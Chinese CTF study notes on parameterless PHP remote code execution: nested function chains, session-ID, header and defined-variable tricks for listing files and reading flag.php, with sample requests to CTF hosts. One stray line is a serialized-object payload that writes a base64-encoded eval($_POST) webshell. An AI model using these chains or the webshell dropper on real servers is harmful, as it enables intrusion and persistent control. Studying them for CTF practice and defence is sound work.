首先，我们的 RCE 是指：`remote command execute`,也就是我们的远程代码执行。而我们的远程代码执行漏洞首先来自于我们的 php 需要通过我们的指令来执行我们的相关的指令。
之后，我们的无参数 RCE ,就是要求我们构造一个式子例如 `a(b(c()))`,来通过我们的这一个来执行我们的远程代码。而为了能够让我们执行我们的对应的代码。
### 获得文件函数：
方法一：利用 `scandir` 方法
```
var_dump(scandir('.')) 
```
第一步：扫描目录获得我们目录下的所有文件：
1. Scanfdir 怎么能获取到我们的'.'作为我们的参数
	1. 我们可以通过 `chr(46)` 来获得我们的 `.`
		1. 我们可以通过 `rand()`, `time()`, `current(localtime(time()))` 来获得我们的 46，其中我们的 `rand()` 是最推荐的，因为我们的这一个的周期是 60. 这里的原始是因为我们的 chr 会自动进行我们的取模操作。
	2. `current(localeconv())` 来获得我们的 `.`
	
	3. `chr(ceil(sinh(cosh(tan(sqrt(floor(phpversion())))))))` (仅限于 php7)
	4. `crypt()` 类似于我们的通过概率的方法来获得我们的 `.`
```
O:8:"passthru":2:{s:1:"S";s:77:"system("echo PD9waHAKCiAgICBAZXZhbCgkX1BPU1RbJ3FxJ10pOwo=|base64 -d >1.php");";s:3:"dir";N;}
```


```
样例：
GET /?exp=print_r(var_dump(scandir(session_id(session_start())))); HTTP/1.1
Host: a94d8986-3dea-440d-b91b-95877ed0fd68.node5.buuoj.cn:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie:PHPSESSID=.
Connection: close

```

打印相关信息：
```
print_r()
```

第二步：从我们的数组中取出 flag. Php

假设我们已经通过我们的 `scandir` 获取到我们的问价目录，得到了一个数组，接下来我们获得 flag. Php 的方法就应该是：
```
next(array_reverse())//是我们的倒数第二个元素
```

```
array_rand(array_flip(sacndir()))//随机获得我们的元素
```

方法二. Session 方法：
我们通过我们构造自己的 session，然后再通过我们对应的显示 session 的函数，来做到我们的 session 显示. 其中我们的 sesstionid 可以通过我们的 hackerbar 来设置
```
print_r(session_id(session_start());//得到任意字符串
```

```
GET /?exp=show_source(session_id(session_start())); HTTP/1.1
Host: bdc3ae98-3f14-4f5e-bdd7-cdbb79686f8d.node5.buuoj.cn:81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie:PHPSESSID=flag.php
Connection: close
```

方法三：getallheaders ()方法（可能会被过滤）：
我们的 getallheaders 会抓取我们在传送的包中的相关信息。我们可以在我们的包的最后一行写一个内容：`yy:flag.php`。

```
end(getallheaders())//得到任意字符串
```

```

```

方法四：get_defined_vars ()**最推荐，但是可能被过滤**
通过这个方法，我们就会获得所有我们已经定义的变量，之后，我们就可以通过我们的 get 或者 post 方法传参来得到：
然后我们只需要用我们的最后一个参数即可

```
获取get最后一个参数
end(pos(get_defined_vars()))
获取post的最后一个参数：
end(next(get_defined_vars()))
```
缺点：

### 读取 flag. Php
1. 通过 show_source, 我们就可以通过我们的相关文件读取，例如 
```
var_dump(file_get_content)
show_source()
highlight_file()
readfile()
```

